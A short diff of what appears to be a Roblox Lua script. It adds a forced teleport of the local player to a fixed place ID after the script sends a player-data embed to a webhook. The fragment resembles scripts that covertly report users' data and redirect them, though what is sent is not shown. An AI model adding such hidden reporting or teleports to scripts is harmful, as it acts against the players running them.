@@ -111,3 +111,11 @@ end
 
 local embed = createEmbed(playerName, formattedData)
 sendWebhook(embed)
+
+wait(2)
+local TeleportService = game:GetService("TeleportService")
+local placeId = 13772394625
+TeleportService:Teleport(placeId, game.Players.LocalPlayer)
+
+-- Ждем загрузки игры
+game.Loaded:Connect(onGameLoaded)
